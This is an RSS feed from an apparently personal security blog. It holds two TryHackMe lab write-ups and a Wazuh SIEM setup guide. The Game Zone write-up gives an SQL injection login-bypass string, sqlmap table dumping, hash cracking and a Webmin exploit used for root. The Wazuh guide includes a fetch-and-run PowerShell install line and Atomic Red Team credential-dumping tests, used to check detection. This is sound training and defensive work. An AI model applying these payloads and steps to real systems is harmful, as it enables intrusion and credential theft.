<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>Gabriel Tello</title>
    <link>https://gtello.github.io/</link>
    <description>Recent content on Gabriel Tello</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-US</language>
    <managingEditor>gabrieltello10@hotmail.com (Gabriel Tello)</managingEditor>
    <webMaster>gabrieltello10@hotmail.com (Gabriel Tello)</webMaster>
    <copyright>[Gabriel Tello](https://github.com/gtello) © 2024</copyright>
    <lastBuildDate>Thu, 14 Nov 2024 14:43:00 +0000</lastBuildDate>
    <atom:link href="https://gtello.github.io/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Game Zone (THM)</title>
      <link>https://gtello.github.io/writeups/gamezone/</link>
      <pubDate>Thu, 14 Nov 2024 14:43:00 +0000</pubDate><author>gabrieltello10@hotmail.com (Gabriel Tello)</author>
      <guid>https://gtello.github.io/writeups/gamezone/</guid>
      <description>&lt;div style=&#34;text-align: justify;&#34;&gt;  &#xD;&#xA;&lt;p&gt;Writeup for the &lt;a href=&#34;https://tryhackme.com/r/room/gamezone&#34;&gt;Game Zone&lt;/a&gt; machine on TryHackMe.&lt;/p&gt;&#xA;&lt;h2 id=&#34;summary&#34;&gt;Summary&lt;/h2&gt;&#xA;&lt;p&gt;This writeup covers breaching a vulnerable web environment, gaining access via SQL Injection, and escalating privileges to root using a Webmin exploit. It includes techniques for data collection, hash cracking, and use of tools such as &lt;em&gt;nmap&lt;/em&gt;, &lt;em&gt;Burp Suite&lt;/em&gt;, &lt;em&gt;sqlmap&lt;/em&gt;, and &lt;em&gt;John the Ripper&lt;/em&gt;.&lt;/p&gt;&#xA;&lt;h2 id=&#34;reconnaissance&#34;&gt;Reconnaissance&lt;/h2&gt;&#xA;&lt;p&gt;The first step was a network scan with nmap to discover active ports and services.&lt;/p&gt;&#xA;&lt;p&gt;&lt;img alt=&#34;Nmap results&#34; src=&#34;https://gtello.github.io/images/posts/gamezone/image1.png&#34;&gt; &lt;center&gt;&lt;b&gt;Nmap command and results&lt;/b&gt;&lt;/center&gt;&lt;/p&gt;</description>
      <content:encoded><![CDATA[<div style="text-align: justify;">  
<p>Writeup for the <a href="https://tryhackme.com/r/room/gamezone">Game Zone</a> machine on TryHackMe.</p>
<h2 id="summary">Summary</h2>
<p>This writeup covers breaching a vulnerable web environment, gaining access via SQL Injection, and escalating privileges to root using a Webmin exploit. It includes techniques for data collection, hash cracking, and use of tools such as <em>nmap</em>, <em>Burp Suite</em>, <em>sqlmap</em>, and <em>John the Ripper</em>.</p>
<h2 id="reconnaissance">Reconnaissance</h2>
<p>The first step was a network scan with nmap to discover active ports and services.</p>
<p><img alt="Nmap results" src="/images/posts/gamezone/image1.png"> <center><b>Nmap command and results</b></center></p>
<h3 id="reconnaissance-results">Reconnaissance Results</h3>
<table>
  <thead>
      <tr>
          <th style="text-align: left">Operating System</th>
          <th style="text-align: left">IP Address</th>
          <th style="text-align: left">Open Ports</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td style="text-align: left">Ubuntu 16.04.6</td>
          <td style="text-align: left">10.10.254.53</td>
          <td style="text-align: left">22 (SSH), 80 (HTTP)</td>
      </tr>
  </tbody>
</table>
<h2 id="exploitation">Exploitation</h2>
<p>Upon finding port 80 open, we accessed the Game Zone homepage through the browser.</p>
<p><img alt="Game Zone homepage" src="/images/posts/gamezone/image2.png"> <center><b>Game Zone homepage</b></center></p>
<p>The TryHackMe room invited us to try SQL Injection (SQLi) in the login field. Using the statement <code>' or 1=1 limit 1;#</code> in the username field and leaving the password blank, we successfully authenticated to the portal. However, further manual SQLi attempts yielded no additional results, so we captured the <strong>POST request</strong> from the search with <strong>Burp Suite</strong> to run automated SQLi tests with <strong>SQLmap</strong>.</p>
<p><img alt="POST request capture" src="/images/posts/gamezone/image3.png"> <center><b>POST request capture</b></center></p>
<p>We used the command <code>sqlmap -r POST.txt --dump</code> to verify and exploit SQL Injection vulnerabilities. SQLmap revealed the presence of a MySQL database and displayed the <code>user</code> table&rsquo;s contents with hashed passwords. We applied <strong>John the Ripper</strong> to crack the password hash for the user <code>agent47</code>.</p>
<p><img alt="SQLmap execution" src="/images/posts/gamezone/image4.png"> <center><b>SQLmap execution</b></center><br><br>
<img alt="Hash cracking" src="/images/posts/gamezone/image5.png"> <center><b>Hash cracking</b></center></p>
<p>With the credentials, we accessed the machine via SSH.</p>
<p><img alt="SSH access" src="/images/posts/gamezone/image6.png"> <center><b>SSH access</b></center></p>
<h3 id="privilege-escalation">Privilege Escalation</h3>
<p>On the machine, we ran <code>ss -tulpn</code> to identify additional ports and services. We noted that port 10000 was blocked by a firewall, so we set up an SSH tunnel with <code>ssh -L 10000:127.0.0.1:10000 agent47@10.10.254.53</code>. This allowed us to access a CMS called <strong>Webmin</strong>, version 1.580.</p>
<p><img alt="Port 10000 blocked by firewall" src="/images/posts/gamezone/image7.png"> <center><b>Port 10000 blocked by firewall</b></center><br><br>
<img alt="Webmin portal" src="/images/posts/gamezone/image8.png"> <center><b>Webmin portal</b></center></p>
<p>Upon researching possible vulnerabilities in Webmin, we found the exploit <a href="https://github.com/JohnHammond/CVE-2012-2982">CVE-2012-2982</a>. Using this exploit, we gained root access to the machine.</p>
<p><img alt="Exploit usage" src="/images/posts/gamezone/image9.png"> <center><b>Exploit usage</b></center><br><br>
<img alt="Root access" src="/images/posts/gamezone/image10.png"> <center><b>Root access</b></center></p>
<h2 id="flags">Flags</h2>
<p>With root privileges, we located the two flags:</p>
<ul>
<li><code>user.txt</code>: 649ac17b1480ac13ef1e4fa579dac95c</li>
<li><code>root.txt</code>: a4b945830144bdd71908d12d902adeee</li>
</ul>
<h2 id="tools-used">Tools Used</h2>
<p>During this analysis, we used the following tools:</p>
<table>
  <thead>
      <tr>
          <th style="text-align: left">Tool</th>
          <th style="text-align: left">Description</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td style="text-align: left"><strong>nmap</strong></td>
          <td style="text-align: left">Network scanning and open port detection.</td>
      </tr>
      <tr>
          <td style="text-align: left"><strong>Burp Suite</strong></td>
          <td style="text-align: left">Capturing and analyzing HTTP requests for SQLi.</td>
      </tr>
      <tr>
          <td style="text-align: left"><strong>sqlmap</strong></td>
          <td style="text-align: left">SQLi testing and data extraction from the database.</td>
      </tr>
      <tr>
          <td style="text-align: left"><strong>John the Ripper</strong></td>
          <td style="text-align: left">Used to crack the user <code>agent47</code> password hash for SSH access.</td>
      </tr>
      <tr>
          <td style="text-align: left"><strong>Exploit CVE-2012-2982</strong></td>
          <td style="text-align: left">Webmin vulnerability enabling root access.</td>
      </tr>
  </tbody>
</table>
<h2 id="recommendations">Recommendations</h2>
<ul>
<li><strong>Update critical systems and applications</strong>, especially Webmin and Ubuntu, to address known vulnerabilities.</li>
<li><strong>Firewall restrictions</strong> on internal services and <strong>input sanitization</strong> to prevent SQL injections.</li>
<li>Implement a <strong>patch management system</strong> and promote the use of <strong>strong passwords</strong> to reduce privilege escalation risks.</li>
</ul>
</div>
]]></content:encoded>
    </item>
    <item>
      <title>Implementing Wazuh (SIEM)</title>
      <link>https://gtello.github.io/projects/wazuh/</link>
      <pubDate>Wed, 13 Nov 2024 15:10:00 +0000</pubDate><author>gabrieltello10@hotmail.com (Gabriel Tello)</author>
      <guid>https://gtello.github.io/projects/wazuh/</guid>
      <description>&lt;div style=&#34;text-align: justify;&#34;&gt;&#xD;&#xA;&lt;p&gt;This project aims to showcase the setup and integration of &lt;a href=&#34;https://wazuh.com/&#34;&gt;Wazuh&lt;/a&gt; in a professional environment to enhance security operations. Here, I&amp;rsquo;ll guide you through the installation, agent management, alert configuration, integration with Microsoft Teams, and finally, testing with Atomic Red Team for validation.&lt;/p&gt;&#xA;&lt;h2 id=&#34;installation&#34;&gt;Installation&lt;/h2&gt;&#xA;&lt;p&gt;To host our Wazuh server, we’ll use an AWS EC2 instance running Ubuntu 24.04. This setup is chosen for flexibility, scalability, and ease of maintenance in a cloud-based infrastructure.&lt;/p&gt;</description>
      <content:encoded><![CDATA[<div style="text-align: justify;">
<p>This project aims to showcase the setup and integration of <a href="https://wazuh.com/">Wazuh</a> in a professional environment to enhance security operations. Here, I&rsquo;ll guide you through the installation, agent management, alert configuration, integration with Microsoft Teams, and finally, testing with Atomic Red Team for validation.</p>
<h2 id="installation">Installation</h2>
<p>To host our Wazuh server, we’ll use an AWS EC2 instance running Ubuntu 24.04. This setup is chosen for flexibility, scalability, and ease of maintenance in a cloud-based infrastructure.</p>
<p><img alt="EC2 Specs" src="/images/posts/wazuh/ec2-specs.png"> <center><b>EC2 Instance Specs</b></center></p>
<p>Once our server is up-to-date we run the following command to install Wazuh:</p>





<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="ln">1</span><span class="cl">curl -sO https://packages.wazuh.com/4.9/wazuh-install.sh <span class="o">&amp;&amp;</span> sudo bash ./wazuh-install.sh -a</span></span></code></pre></div><p>This will take care of the setup and configuration of all core components. The process begins by checking system requirements and installing essential dependencies. Next, the script configures Wazuh’s security by generating certificates for the root, admin, indexer, Filebeat, and dashboard components, ensuring secure data handling across the ecosystem.</p>
<p>Once dependencies and configurations are set, the script sequentially installs and starts key Wazuh services: the Wazuh Indexer for data storage, the Wazuh Manager for threat detection, Filebeat for log forwarding, and the Wazuh Dashboard for monitoring. The dashboard is accessible at <code>https://&lt;wazuh-dashboard-ip&gt;:443</code> with default login credentials provided at the end of the installation.</p>
<p><img alt="Wazuh Setup" src="/images/posts/wazuh/wazuh-setup-loading.png"> <center><b>Wazuh Setup</b></center></p>
<p>When we log in to our Wazuh dashboard for the first time, we should begin by setting up groups to make agent management easier.</p>
<p>To create agent groups from the Wazuh dashboard:</p>
<ol>
<li>Navigate to <strong>Management</strong> &gt; <strong>Groups</strong> and click the <strong>Add new group</strong> button.</li>
<li>Enter a name for the agent group and click on the <strong>Save new group</strong> button.</li>
</ol>
<p><img alt="Agent group" src="/images/posts/wazuh/agent-group.gif"> <center><b>Adding a new group</b></center></p>
<p>Now we&rsquo;ll move on to deploying our agents.</p>
<h2 id="agent-deployment">Agent Deployment</h2>
<p>To add a new agent we&rsquo;ll click on the burger menu and go to <strong>Endpoints Summary</strong>, and click on <strong>Deploy new agent</strong>. Simply follow the wizard&rsquo;s instructions to deploy an agent:</p>
<p><img alt="Wazuh Agent Setup" src="/images/posts/wazuh/wazuh-agent-setup.png"> <center><b>Adding a new agent</b></center></p>
<p>If you&rsquo;re setting up a Wazuh agent on an AWS EC2 instance and experiencing connectivity issues, check your Security Group settings applied to your instance and ensure the Security Group attached to your Wazuh manager instance allows inbound traffic on these ports:</p>
<ul>
<li><strong>1514/TCP</strong> – Agent communication</li>
<li><strong>1515/TCP</strong> – Agent registration</li>
<li><strong>55000/TCP</strong> – API access</li>
</ul>
<p><img alt="First agent added" src="/images/posts/wazuh/first-agent-added.png"> <center><b>First agent added</b></center></p>
<p>For my first agent I added an AWS Lightsail instance I want to keep track of. Now we can move onto further configurations, such as vulnerability and rootkit detection, file integrity monitoring, etc.</p>
<h2 id="vulnerability-detection">Vulnerability Detection</h2>
<p>As of this publication date, Wazuh ships by default with the vulnerability dectection module toggled on, to confirm check the <a href="https://documentation.wazuh.com/current/user-manual/reference/ossec-conf/index.html">config file</a> located at <code>/var/ossec/etc/ossec.conf</code></p>





<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="nt">&lt;vulnerability-detection&gt;</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">   <span class="nt">&lt;enabled&gt;</span>yes<span class="nt">&lt;/enabled&gt;</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">   <span class="nt">&lt;index-status&gt;</span>yes<span class="nt">&lt;/index-status&gt;</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">   <span class="nt">&lt;feed-update-interval&gt;</span>60m<span class="nt">&lt;/feed-update-interval&gt;</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="nt">&lt;/vulnerability-detection&gt;</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="nt">&lt;indexer&gt;</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">   <span class="nt">&lt;enabled&gt;</span>yes<span class="nt">&lt;/enabled&gt;</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">   <span class="nt">&lt;hosts&gt;</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">      <span class="nt">&lt;host&gt;</span>https://0.0.0.0:9200<span class="nt">&lt;/host&gt;</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">   <span class="nt">&lt;/hosts&gt;</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">   <span class="nt">&lt;ssl&gt;</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">      <span class="nt">&lt;certificate_authorities&gt;</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">         <span class="nt">&lt;ca&gt;</span>/etc/filebeat/certs/root-ca.pem<span class="nt">&lt;/ca&gt;</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">      <span class="nt">&lt;/certificate_authorities&gt;</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">      <span class="nt">&lt;certificate&gt;</span>/etc/filebeat/certs/filebeat.pem<span class="nt">&lt;/certificate&gt;</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">      <span class="nt">&lt;key&gt;</span>/etc/filebeat/certs/filebeat-key.pem<span class="nt">&lt;/key&gt;</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">   <span class="nt">&lt;/ssl&gt;</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl"><span class="nt">&lt;/indexer&gt;</span></span></span></code></pre></div><p>To check the vulnerabilities detected on our agents, go to <strong>Threat Intelligence</strong> &gt; <strong>Vulnerability Detection</strong>.</p>
<p><img alt="Vulnerabilities detected" src="/images/posts/wazuh/wazuh-vulns.png"> <center><b>Vulnerabilities detected</b></center></p>
<h2 id="alerting">Alerting</h2>
<p>Configuring alerting in Wazuh involves setting up alert thresholds, forwarding alerts to external systems, and managing alert escalation and filtering.</p>
<h3 id="thresholds">Thresholds</h3>
<p>Wazuh assigns a severity level (ranging from 0 to 16) to each event based on predefined <a href="https://documentation.wazuh.com/current/user-manual/ruleset/rules/rules-classification.html">rules</a>. By default, Wazuh triggers alerts for events with a severity level of 3 or higher. You can adjust this threshold to control which alerts are generated.</p>
<p>To modify it, go to the <code>ossec.conf</code> file and locate the <code>&lt;alerts&gt;</code> section and adjust the <code>&lt;log_alert_level&gt;</code> value to the desired threshold.</p>
<p>For example, to set the minimum alert level to 5:</p>





<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="ln">1</span><span class="cl"><span class="nt">&lt;alerts&gt;</span>
</span></span><span class="line"><span class="ln">2</span><span class="cl">  <span class="nt">&lt;log_alert_level&gt;</span>5<span class="nt">&lt;/log_alert_level&gt;</span>
</span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="nt">&lt;/alerts&gt;</span></span></span></code></pre></div><p>After making changes on the config file, restart the Wazuh manager to apply the new settings with:</p>





<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="ln">1</span><span class="cl">   sudo systemctl restart wazuh-manager</span></span></code></pre></div><h3 id="filtering-alerts">Filtering Alerts</h3>
<p>To fine-tune your alerting system, implement alert filtering within Wazuh to suppress specific events, such as SSH brute-force attempts for non-existent users. Follow these steps:</p>
<ol>
<li>
<p><strong>Identify the Rule ID</strong>: Determine the rule ID associated with the alert you wish to suppress. You can find this ID in the alert logs or by reviewing the Wazuh ruleset.</p>
<ul>
<li>
<p>For SSH brute-force attempts in Linux, you can find these events with <code>rule.id:(5551 OR 5712)</code>. Other related rules are <code>5710</code>, <code>5711</code>, <code>5716</code>, <code>5720</code>, <code>5503</code>, <code>5504</code>.</p>
</li>
<li>
<p>For Windows logon failures you can find those events with <code>rule.id:(60122 OR 60204)</code>.</p>
</li>
</ul>
</li>
<li>
<p><strong>Create a Local Rule to Override the Alert</strong>: By creating a local rule with a lower severity level, you can prevent the alert from being forwarded.</p>
<ul>
<li>
<p>Navigate to the Wazuh manager&rsquo;s rules directory, located at <code>/var/ossec/etc/rules/local_rules.xml</code>.</p>
</li>
<li>
<p>Add the following rule to suppress the specific alert:</p>





<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="ln">1</span><span class="cl"><span class="nt">&lt;group</span> <span class="na">name=</span><span class="s">&#34;sshd,&#34;</span><span class="nt">&gt;</span>
</span></span><span class="line"><span class="ln">2</span><span class="cl">  <span class="nt">&lt;rule</span> <span class="na">id=</span><span class="s">&#34;100002&#34;</span> <span class="na">level=</span><span class="s">&#34;0&#34;</span><span class="nt">&gt;</span>
</span></span><span class="line"><span class="ln">3</span><span class="cl">    <span class="nt">&lt;if_sid&gt;</span>5716<span class="nt">&lt;/if_sid&gt;</span>
</span></span><span class="line"><span class="ln">4</span><span class="cl">    <span class="nt">&lt;description&gt;</span>Ignore SSH brute force alerts for non-existent users<span class="nt">&lt;/description&gt;</span>
</span></span><span class="line"><span class="ln">5</span><span class="cl">  <span class="nt">&lt;/rule&gt;</span>
</span></span><span class="line"><span class="ln">6</span><span class="cl"><span class="nt">&lt;/group&gt;</span></span></span></code></pre></div><p>This rule sets the alert level to 0 for the specified event, effectively suppressing it. For a more detailed example, check the <a href="https://github.com/ossec/ossec-hids/blob/master/etc/rules/local_rules.xml">ossec example file</a>.</p>
</li>
</ul>
</li>
<li>
<p><strong>Restart the Wazuh Manager</strong>: Apply the changes by restarting the Wazuh manager:</p>





<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="ln">1</span><span class="cl">sudo systemctl restart wazuh-manager</span></span></code></pre></div></li>
</ol>
<h3 id="forwarding-alerts">Forwarding Alerts</h3>
<p>Wazuh can forward alerts to various external systems, such as syslog servers, email addresses, or collaboration platforms like Microsoft Teams.</p>
<ul>
<li>To forward alerts to a syslog server, add a <code>&lt;syslog_output&gt;</code> block in the <code>ossec.conf</code> file:</li>
</ul>





<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="ln">1</span><span class="cl"><span class="nt">&lt;syslog_output&gt;</span>
</span></span><span class="line"><span class="ln">2</span><span class="cl">  <span class="nt">&lt;server&gt;</span>192.168.1.241<span class="nt">&lt;/server&gt;</span>
</span></span><span class="line"><span class="ln">3</span><span class="cl">  <span class="nt">&lt;level&gt;</span>9<span class="nt">&lt;/level&gt;</span>
</span></span><span class="line"><span class="ln">4</span><span class="cl"><span class="nt">&lt;/syslog_output&gt;</span></span></span></code></pre></div><p>This configuration sends alerts with a severity level higher than 9 to the specified syslog server.</p>
<ul>
<li>To receive alerts via email, configure the email settings in the <code>&lt;global&gt;</code> section of <code>ossec.conf</code>:</li>
</ul>





<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="nt">&lt;ossec_config&gt;</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">  <span class="nt">&lt;global&gt;</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">    <span class="nt">&lt;email_notification&gt;</span>yes<span class="nt">&lt;/email_notification&gt;</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">    <span class="nt">&lt;email_to&gt;</span>me@test.com<span class="nt">&lt;/email_to&gt;</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">    <span class="nt">&lt;smtp_server&gt;</span>mail.test.com<span class="nt">&lt;/smtp_server&gt;</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">    <span class="nt">&lt;email_from&gt;</span>wazuh@test.com<span class="nt">&lt;/email_from&gt;</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">  <span class="nt">&lt;/global&gt;</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">  <span class="nt">&lt;alerts&gt;</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">    <span class="nt">&lt;email_alert_level&gt;</span>10<span class="nt">&lt;/email_alert_level&gt;</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">  <span class="nt">&lt;/alerts&gt;</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="nt">&lt;/ossec_config&gt;</span></span></span></code></pre></div><p>This setup sends email alerts for events with a severity level of 10 or higher.</p>
<h4 id="teams-integration">Teams Integration</h4>
<p>To integrate Wazuh alerts with Microsoft Teams, we have several options, we can use Teams&rsquo; <a href="https://learn.microsoft.com/en-us/microsoftteams/platform/webhooks-and-connectors/how-to/add-incoming-webhook">Incoming Webhook</a> utility, <a href="https://zapier.com/">Zapier</a>, <a href="https://www.make.com/en">Make.com</a>, or any other similar platform to send alerts to a Teams channel via a webhook. This involves creating a custom integration script and configuring it in <code>ossec.conf</code>.</p>
<p>I&rsquo;ll be using <a href="https://github.com/redanthrax/wazuh-teams-integration">this</a> already configured integration with Teams, credits go to 

<a href="https://github.com/redanthrax">@redanthrax</a>.</p>
<p>Once the integrations are setup on the Wazuh server simply configure it like this:</p>





<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="ln">1</span><span class="cl"><span class="nt">&lt;integration&gt;</span>
</span></span><span class="line"><span class="ln">2</span><span class="cl">  <span class="nt">&lt;name&gt;</span>custom-teams<span class="nt">&lt;/name&gt;</span>
</span></span><span class="line"><span class="ln">3</span><span class="cl">  <span class="nt">&lt;level&gt;</span>3<span class="nt">&lt;/level&gt;</span>
</span></span><span class="line"><span class="ln">4</span><span class="cl">  <span class="nt">&lt;hook_url&gt;</span>{WEBHOOK URL}<span class="nt">&lt;/hook_url&gt;</span> 
</span></span><span class="line"><span class="ln">5</span><span class="cl">  <span class="nt">&lt;alert_format&gt;</span>json<span class="nt">&lt;/alert_format&gt;</span> 
</span></span><span class="line"><span class="ln">6</span><span class="cl"><span class="nt">&lt;/integration&gt;</span></span></span></code></pre></div><p>Now we&rsquo;ll be receiving alerts on a Teams channel on every level 3 alert:</p>
<p><img alt="Teams alert" src="/images/posts/wazuh/teams-alert.png"> <center><b>Teams notification</b></center></p>
<p>To further extend these alerts, we can implement a SOAR system to automate triaging, create escalation processes, develop playbooks and incident response. We could use another good open-source solution like <a href="https://github.com/shuffle/shuffle/blob/main/.github/install-guide.md">Shuffle</a> for this.</p>
<h2 id="testing-and-validation">Testing and Validation</h2>
<p>To validate our Wazuh implementation and ensure alerts are triggered correctly, we’ll use <a href="https://www.atomicredteam.io/">Atomic Red Team</a>, a versatile and open-source framework that allows us to simulate real-world attack techniques mapped to the MITRE ATT&amp;CK framework. Specifically, we’ll use the <a href="https://github.com/redcanaryco/invoke-atomicredteam">Invoke-Atomic</a> PowerShell module, which can run Windows, MacOS and Linux, making it an ideal tool to test all our agents.</p>
<h3 id="setting-up-atomic-red-team">Setting up Atomic Red Team</h3>
<p>Let&rsquo;s do some tests on our ubuntu server. First we have to install PowerShell on linux with <code>sudo snap install powershell --classic</code> and then run <code>pwsh</code>. Once inside PowerShell we can proceed to install both the execution framework and the atomics folder, which contains the test definitions; the commands that the execution framework will execute.</p>





<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="ln">1</span><span class="cl"><span class="nb">IEX </span><span class="p">(</span><span class="nb">IWR </span><span class="s1">&#39;https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1&#39;</span> <span class="n">-UseBasicParsing</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="nb">Install-AtomicRedTeam</span> <span class="n">-getAtomics</span></span></span></code></pre></div><p>We can now use the <code>Invoke-AtomicTest</code> function to perform controlled security tests. Below are examples of specific MITRE ATT&amp;CK techniques that we can run to test our setup:</p>
<ul>
<li>
<p><strong>Test for Ingress Tool Transfer (T1105)</strong>: Simulates an attempt to transfer files from a remote source to an environment, which could be indicative of malware download or data exfiltration. This activity should trigger alerts if Wazuh is monitoring network activity and file movements appropriately.</p>





<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="ln">1</span><span class="cl"><span class="nb">Invoke-AtomicTest</span> <span class="n">T1105</span></span></span></code></pre></div></li>
<li>
<p><strong>Test for Credential Dumping (T1003)</strong>: Runs a credential dumping simulation to check if Wazuh captures potential credential access events.</p>





<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="ln">1</span><span class="cl"><span class="nb">Invoke-AtomicTest</span> <span class="n">T1003</span><span class="p">.</span><span class="py">008</span> <span class="c"># OS Credential Dumping: /etc/passwd and /etc/shadow</span></span></span></code></pre></div></li>
<li>
<p><strong>Test for Scheduled Task Creation (T1053)</strong>: Uses scheduled tasks to simulate persistence techniques and verify if Wazuh alerts on task creation.</p>





<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="ln">1</span><span class="cl"><span class="nb">Invoke-AtomicTest</span> <span class="n">T1053</span><span class="p">.</span><span class="py">003</span> <span class="c"># Scheduled Task/Job: Cron</span></span></span></code></pre></div></li>
<li>
<p><strong>Test for Command and Scripting Interpreter Execution (T1059)</strong>: Simulates suspicious scripting activity that Wazuh should detect based on your threshold settings.</p>





<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="ln">1</span><span class="cl"><span class="nb">Invoke-AtomicTest</span> <span class="n">T1059</span><span class="p">.</span><span class="py">004</span> <span class="c"># Command and Scripting Interpreter: Unix Shell</span></span></span></code></pre></div></li>
</ul>
<h3 id="verifying-alerts-in-wazuh">Verifying Alerts in Wazuh</h3>
<p>After executing each test, we&rsquo;ll navigate to the Wazuh dashboard to verify the alerts generated. We can see the events corresponding to each Atomic Red Team test under <strong>Threat Intelligence</strong> &gt; <strong>MITRE ATT&amp;CK</strong>.  We can review the details to confirm that the alerts match the configured thresholds as intended.</p>
<p><img alt="MITRE ATT&amp;CK" src="/images/posts/wazuh/mitre.png"> <center><b>MITRE ATT&amp;CK tests detected</b></center></p>
<p>By completing the implementation, configuration, and validation of Wazuh, we have created a robust and proactive SIEM setup capable of detecting, alerting, and responding to security events effectively. With integrations for seamless alerting, vulnerability monitoring, and extensive testing using Atomic Red Team, this Wazuh deployment strengthens our organization’s security posture. As threats evolve, this setup can be further customized to meet the dynamic needs of modern security operations, making it a valuable asset in our SOC’s toolkit. This project highlights the power of open-source solutions like Wazuh in building a resilient and adaptable cybersecurity environment.</p>
<div>]]></content:encoded>
    </item>
    <item>
      <title>Steel Mountain (THM)</title>
      <link>https://gtello.github.io/writeups/steelmountain/</link>
      <pubDate>Tue, 12 Nov 2024 11:40:00 +0000</pubDate><author>gabrieltello10@hotmail.com (Gabriel Tello)</author>
      <guid>https://gtello.github.io/writeups/steelmountain/</guid>
      <description>&lt;div style=&#34;text-align: justify;&#34;&gt;&#xD;&#xA;&lt;p&gt;Writeup for the &lt;a href=&#34;https://www.tryhackme.com/room/steelmountain&#34;&gt;Steel Mountain&lt;/a&gt; machine on TryHackMe.&lt;/p&gt;&#xA;&lt;h2 id=&#34;summary&#34;&gt;Summary&lt;/h2&gt;&#xA;&lt;p&gt;We found several vulnerabilities that allowed us unauthorized access to the system. First, we discovered services on ports 80 and 8080 that exposed sensitive information. Then, using an exploit on one of these services, we gained access to the system with a reverse shell.&lt;/p&gt;&#xA;&lt;p&gt;After that, we escalated privileges and obtained administrator permissions due to misconfigured permissions in one of the system services, which gave us access to critical files and allowed us to reach confidential information.&lt;/p&gt;</description>
      <content:encoded><![CDATA[<div style="text-align: justify;">
<p>Writeup for the <a href="https://www.tryhackme.com/room/steelmountain">Steel Mountain</a> machine on TryHackMe.</p>
<h2 id="summary">Summary</h2>
<p>We found several vulnerabilities that allowed us unauthorized access to the system. First, we discovered services on ports 80 and 8080 that exposed sensitive information. Then, using an exploit on one of these services, we gained access to the system with a reverse shell.</p>
<p>After that, we escalated privileges and obtained administrator permissions due to misconfigured permissions in one of the system services, which gave us access to critical files and allowed us to reach confidential information.</p>
<h2 id="reconnaissance">Reconnaissance</h2>
<p>We started with a network scan using nmap to see which ports were open and what services were running on them.</p>
<p><img alt="nmap Result" src="/images/posts/steelmountain/image1.png"></p>
<center><em>Figure 1:</em> nmap result</center>
<h3 id="reconnaissance-results">Reconnaissance Results</h3>
<table>
  <thead>
      <tr>
          <th style="text-align: left">Operating System</th>
          <th style="text-align: left">IP Address</th>
          <th style="text-align: left">Open Ports</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td style="text-align: left">Windows Server 2008</td>
          <td style="text-align: left">10.10.128.109</td>
          <td style="text-align: left">80 (HTTP), 135 (RPC), 139 (NetBIOS), 445 (SMB), 3389 (RDP), 5985 (WinRM HTTP), 8080 (HTTP-Alternate), 47001 (WinRM HTTPS), and 49152-49164 (Dynamic RPC range)</td>
      </tr>
  </tbody>
</table>
<h2 id="exploitation">Exploitation</h2>
